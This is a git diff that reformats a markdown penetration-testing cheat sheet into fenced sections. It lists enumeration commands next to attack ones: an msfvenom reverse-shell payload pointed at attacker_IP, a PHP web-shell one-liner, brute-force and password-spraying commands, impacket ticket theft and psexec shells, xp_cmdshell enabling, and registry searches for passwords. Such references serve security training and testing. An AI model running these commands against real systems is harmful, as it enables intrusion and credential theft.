@@ -29,7 +29,6 @@ Welcome to [@muemmelmoehre](https://github.com/muemmelmoehre){:target="blank"}'s
 
 
 ## AMASS
-
 ```
 # subdomain enumeration
 /path/to/amass enum -d domain_here > outfile_here
@@ -37,6 +36,8 @@ Welcome to [@muemmelmoehre](https://github.com/muemmelmoehre){:target="blank"}'s
 # subdomain enumeration with API keys in config_file
 /path/to/amass enum -d domain_here -config /path/to/config_file_here > outfile_here
 ```
+
+
 
 ## BASH / SH
 ```bash
@@ -73,8 +74,9 @@ first_command && second_command
 first_command | second_command 
 ```
 
-## BASH UTILITIES
 
+
+## BASH UTILITIES
 ```bash
 
 # create alias in .bash_profile
@@ -172,11 +174,13 @@ xxd -p filename_here
 ```
 
 
+
 ## CEWL
 ```
 # create a wordlist from URL
 cewl -w /path/to/outfile.txt -v URL_here
 ```
+
 
 
 ## CHECKSEC
@@ -186,8 +190,9 @@ checksec file_name_here
 ```
 
 
-CMD
----
+
+## CMD
+```dos
 # clear screen
 cls
 
@@ -241,10 +246,12 @@ wmic computersystem get domain
 
 # find a domain controller (on box)
 nltest /dsgetdc:domain_name_here
+```
 
 
-CRACKMAPEXEC
-------------
+
+## CRACKMAPEXEC
+```
 # check for password policy on Windows domain
 crackmapexec protocol_here IP_here --pass-pol -u '' -p ''
 
@@ -253,10 +260,12 @@ crackmapexec protocol_here IP_here -u userlist.txt -p passwordlist.txt
 
 # crawl smb shares
 crackmapexec smb IP_here -u user -p password -M spider_plus
+```
 
 
-CURL
-----
+
+## CURL
+```
 # basic syntax
 curl "protocol_here://url_here"
 
@@ -271,22 +280,28 @@ curl -T /path/to/local/file https://url_here/path/to/remote/file
 
 # PUT json data
 curl -X PUT -H "Content-Type: application/json" -d '{"key":"value","key":"value"}' https://url_here
+```
 
 
-DIG
----
+
+## DIG
+```
 # print public IP
 dig +short myip.opendns.com @resolver1.opendns.com
+```
 
 
-DNSRECON
---------
+
+## DNSRECON
+```
 # find hostname
 dnsrecon -d domain_here -r range_here
+```
 
 
-DOS2UNIX / UNIX2DOS
-------------------
+
+## DOS2UNIX / UNIX2DOS
+```
 # convert text files from DOS to Unix (CR/LF -> LF)
 dos2unix filename
 dos2unix filename -n new_file
@@ -294,16 +309,20 @@ dos2unix filename -n new_file
 # convert text files from Unix to DOS (LF -> CR/LF)
 unix2dos filename
 unix2dos filename -n new_file
+```
 
 
-DRUPAL
-------
+
+## DRUPAL
+```
 # droopescan
 droopescan scan drupal -u IP_here
+```
 
 
-ENV
----
+
+## ENV
+```
 # show all environment variables
 env
 
@@ -312,16 +331,20 @@ export VARIABLE_HERE=value_here
 
 # show value
 echo $VARIABLE_HERE
+```
 
 
-EVIL-WINRM
-----------
+
+## EVIL-WINRM
+```
 # get shell on IP_here as user
 evil-winrm -i IP_here -u user -p password 
+```
 
 
-FFUF
-----
+
+## FFUF
+```
 # enumerate files
 ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.html
 ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.php 
@@ -341,16 +364,20 @@ ffuf -w /path/to/wordlist.txt -request file_here
 
 # fuzz with cookies (e.g. authentication)
 ffuf -w /path/to/wordlist.txt -u http://URL_here/FUZZ -b "cookie_here=value_here; another_cookie_here=value_here"
+```
 
 
-FPING
------
+
+## FPING
+```
 # ping sweep
 fping -a -g IP_range 2>/dev/null
+```
 
 
-FTP
----
+
+## FTP
+```
 # connect
 ftp IP_here
 
@@ -365,19 +392,23 @@ binary
 
 # rename file
 rename old_file_name new_file_name
+```
 
 
-GOBUSTER
---------
+
+## GOBUSTER
+```
 # enumerate web folders
 gobuster dir -u http://IP_here -w /path/to/wordlist.txt -o root-dir
 
 # skip SSL certificate verfication
 gobuster dir -u http://IP_here -w /path/to/wordlist.txt -k
+```
 
 
-GOOGLE DORKS
-------------
+
+## GOOGLE DORKS
+```
 # URL
 inurl:(extension_here|other_extension_here)
 
@@ -399,54 +430,66 @@ OR
 
 # filter out keyword
 -keyword_here
+```
 
 
-GPP-DECRYPT
------------
+
+## GPP-DECRYPT
+```
 # decrypt password from group policy preferences
 gpp-decrypt ciphertext_here
+```
 
 
-HASHCAT
--------
+
+## HASHCAT
+```
 # permute words in wordlist
 hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule
 
 # crack hash (with salt : append salt after hash in file : hash_here:salt_here)
 hashcat -m hash_format_code_here /path/to/hash /path/to/wordlist
+```
 
 
-HDIUTIL
--------
+
+## HDIUTIL
+```
 # attach .dmg
 hdiutil attach /path/to/dmg
 cd /path/to/volume
 
 # detach .dmg
 hdiutil detach /path/to/volume
+```
 
 
-HOST
-----
+
+## HOST
+```
 # request name server for domain
 host -t ns url_here
 
 # zone transfer
 host -l url_here name_server_here
+```
 
 
-HYDRA
------
+
+## HYDRA
+```
 # dictionary attack
 hydra -L users.txt -P passwords.txt <protocol://IP_here> <options>
 hydra -l user_name_here -P /path/to/wordlist <protocol://IP_here> <options>
 
 # dictionary attack - web form
 hydra l user_name_here -p /path/to/wordlist url_here http-form-post "/path/to/login/form:user_name_param=^USER^&password_param=^PASS^&submit=Login:error_message_upon_failed_login_here"
+```
 
 
-IMPACKET
---------
+
+## IMPACKET
+```
 # get TGT for users with UF_DONT_REQUIRE_PREAUTH
 /path/to/impacket/examples/GetNPUsers.py domain/ -usersfile /path/to/users.txt -no-pass -outputfile /path/to/tgt.txt
 
@@ -461,10 +504,12 @@ IMPACKET
 
 # get shell as user
 /path/to/impacket/psexec.py domain/user@IP_here
+```
 
 
-JOHN
-----
+
+## JOHN
+```
 # crack password hash - dictionary attack
 john -w=/path/to/wordlist /path/to/hash
 
@@ -482,10 +527,12 @@ john --show /path/to/hash
 
 # convert kdbx to john
 keepass2john db_here.kdbx
+```
 
 
-LDAP
-----
+
+## LDAP
+```
 # nmap script
 nmap --script ldap-search IP_here 
 
@@ -495,16 +542,20 @@ ldapsearch -x -h IP_here -s sub -b 'dc=domain_here,dc=dc2_here'
 
 # get domain name
 ldapsearch -x -h IP_here -s base namingcontexts
+```
 
 
-MONGO
------
+
+## MONGO
+```sql
 # connect to mongoDB database
 mongo -u user_here -p password_here IP_here:port_here
+```
 
 
-MSFCONSOLE
-----------
+
+## MSFCONSOLE
+```
 # import new exploit (Kali)
 wget url_to_raw_ruby_exploit
 cp ruby_exploit /usr/share/metasploit-framework/modules/exploits/path/to/fitting/category/exploit.rb
@@ -514,25 +565,31 @@ cp ruby_exploit /usr/share/metasploit-framework/modules/exploits/path/to/fitting
 wget url_to_raw_ruby_exploit
 cp ruby_exploit /opt/metasploit-framework/embedded/framework/modules/exploits/path/to/fitting/category/exploit.rb
 # exit msfconsole + restart
+```
 
 
-MSFVENOM
---------
+
+## MSFVENOM
+```
 # list available payloads
 msfvenom --list payloads
 
 # create Windows TCP reverse shell exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
+```
 
 
-MSSQL
------
+
+## MSSQL
+```sql
 # connect to a db server as user
 mssql -s IP_db_server -o port -u username -p password
+```
 
 
-MYSQL / MARIADB
----------------
+
+## MYSQL / MARIADB
+```sql
 # start service
 systemctl start mysql.service
 
@@ -589,10 +646,12 @@ flush privileges;
 
 # delete user
 drop user 'username'@'IP_here';
+```
 
 
-NETCAT
-------
+
+## NETCAT
+```php
 #establish connection
 nc target_IP port_here
 nc -v target_IP port_here
@@ -634,10 +693,12 @@ echo $result;
 echo '</pre>';
 }
 ?>
+```
 
 
-NET
----
+
+## NET
+```
 # add new user
 net user user_here password_here /add
 
@@ -658,19 +719,23 @@ net view IP_here
 
 # test for null session on share
 net use \\IP_here\IPC$ '' /u:''
+```
 
 
-NIKTO
------
+
+## NIKTO
+```
 # scan host / site
 nikto -h host_site_here
 
 # scan host / site with authentication
 nikto -h host_site_here -i user_here:password_here
+```
 
 
-NMAP
-----
+
+## NMAP
+```
 # ping sweep
 nmap -sn IP_range
 nmap -sn -iL IP_list_file_here
@@ -716,49 +781,61 @@ nmap --script some_script -p port_here IP_here -d
 
 # check supported HTTP methods
 nmap -p 443 --script http-methods --script-args http-methods.url-path='/my/path/here' url_here
+```
 
 
-NSLOOKUP
---------
+
+## NSLOOKUP
+```
 # find hostname of IP_here
 nslookup
 server DNS_IP_here
 127.0.0.1
 IP_here
+```
 
 
-OPENSSL
--------
+
+## OPENSSL
+```
 # banner grabbing (2 empty lines required between headers + body!)
 openssl s_client -connect target_ip:443
 HEAD / HTTP/1.1
 
 
+```
 
 
-PERL
-----
+
+## PERL
+```perl
 # generate string of 20 A + concatenate with ABCD
 $(perl -e 'print "\x41" x 20 . "ABCD"')
+```
 
 
-PHP
----
+
+## PHP
+```php
 # interactive mode
 php -a
 
 # define http request variables : parameter can be used in subsequent GET + POST requests
 <?php system($_REQUEST['parameter_name_here']); ?>
+```
 
 
-PIP
----
+
+## PIP
+```python
 # install pip package
 python3 -m pip install package
+```
 
 
-POWERSHELL
-----------
+
+## POWERSHELL
+```powershell
 # import module
 Import-Module module_name_here
 
@@ -793,10 +870,12 @@ New-PSDrive -Name "drive_name_here" -PSProvider "FileSystem" -Root "\\IP_here\sh
 
 # check OS architecture
 [Environment]::Is64BitOperatingSystem
+```
 
 
-PYTHON
-------
+
+## PYTHON & PYTHON3
+```python
 # user python path from env
 #!/usr/bin/env python
 #!/usr/bin/env python3
@@ -837,10 +916,12 @@ cyclic_find("substring_here")
 with open("file_name_here","mode_here",encoding="encoding_here") as file:
   for line in file:
     do_something
+```
 
 
-RADARE2
--------
+
+## RADARE2
+```
 # open binary in debug mode
 r2 -d /path/to/binary
 
@@ -874,19 +955,23 @@ dr
 
 # reload program
 ood
+```
 
 
-REG QUERY
----------
+
+## REG QUERY
+```
 # enumerate registry information, search recursively for password in HKLM
 reg query HKLM /f password /t REG_SZ /s
 
 # enumerate registry information, search recursively for password in HKCU
 reg query HKCU /f password /t REG_SZ /s
+```
 
 
-RPC
----
+
+## RPC
+```
 # connect anonymously
 rpcclient -U "" IP_here
 
@@ -907,19 +992,23 @@ enumdomusers
 
 # rpcclient - display description fields
 querydispinfo
+```
 
 
-RPCBIND
--------
+
+## RPCBIND
+```
 # enumerate rpcbind
 rpcinfo IP_here
 
 # show export list for NFS server
 showmount -e IP_here
+```
 
 
-SCP
----
+
+## SCP
+```
 # copy remote file to local machine
 scp user@IP_here:/path/to/remote/file /path/to/local/file
 
@@ -931,10 +1020,12 @@ scp -i private_key_here user@IP_here:/path/to/remote/file /path/to/local/file
 
 # authenticate with ssh key + copy local file to remote machine
 scp -i private_key_here /path/to/local/file user@IP_here:/path/to/remote/file 
+```
 
 
-SFTP
-----
+
+## SFTP
+```
 # connect as user
 sftp -oPort=port user@IP_here
 
@@ -943,19 +1034,23 @@ put /path/to/local/file [/path/remote]
 
 # download file
 get /path/to/remote/file
+```
 
 
-SIPVICIOUS
-----------
+
+## SIPVICIOUS
+```
 # enumerate SIP servers
 svmap IP_range_here
 
 # enumerate valid extensions for SIP endpoints
 svwar -m INVITE IP_here
+```
 
 
-SMB
----------
+
+## SMB
+```
 # enumerate shares with anonymous login
 smbclient -L smb -I IP_here
 
@@ -1005,16 +1100,20 @@ sudo mount -t cifs -o 'user=user_here,password=password_here' //IP_here/share_he
 
 # create share for file transfer
 /path/to/impacket-smbserver share_name_here `password_here`
+```
 
 
-SQLITE3
---------
+
+## SQLITE3
+```
 # display database content
 sqlite3 database_here .dump
+```
 
 
-SQLMAP
-------
+
+## SQLMAP
+```
 # launch sqlmap from a GET / POST request file
 python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3
 
@@ -1023,10 +1122,12 @@ python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3 --dbms=DBMS_
 
 # list available tampers
 python /path/to/sqlmap --list-tampers
+```
 
 
-SQSH
-----
+
+## SQSH
+```
 # connect to SQL database
 sqsh -S IP_here -U user_here -P password_here
 
@@ -1039,10 +1140,12 @@ EXEC SP_CONFIGURED 'show advanced options',1
 EXEC SP_CONFIGURE 'xp_cmdshell',1
 reconfigure
 go
+```
 
 
-SSH
----
+
+## SSH
+```
 # connect as user with password
 ssh user@IP
 
@@ -1051,10 +1154,12 @@ ssh -i private_key user@IP
 
 # port forwarding
 ssh -L port_to_forward_to:IP_here:port_to_forward_from
+```
 
 
-TCPDUMP
--------
+
+## TCPDUMP
+```
 # list all interfaces
 tcpdump -D
 
@@ -1070,32 +1175,40 @@ tcpdump -i interface_here dst IP_here and port port_here
 # listen for ping
 tcpdump -i interface_here icmp
 tcpdump -i interface_here icmp and icmp[icmptype]=icmp-echo
+```
 
 
-VIM
----
+
+## VIM
+```
 # jump to line
 :line_number_here
+```
 
 
-WGET
-----
+
+## WGET
+```
 # retrieve folders + files from ftp
 wget --mirror 'ftp://user_here:password_here@hostname.domain'
 wget --mirror 'ftp://user_here:password_here@IP_here'
+```
 
 
-WINEXE
-------
+
+## WINEXE
+```
 # get shell on IP_here as user with password
 winexe -U domain_here/user_here%password_here cmd.exe
 
 # get shell on IP_here as user with lm:ntlm hash
 pth-winexe -U domain_here/user_here cmd.exe
+```
 
 
-7Z
---
+
+## 7Z
+```
 # extract password-protected archive (special characters in password need to be escaped with \)
 7z e archive_here.zip -ppassword_here 
 
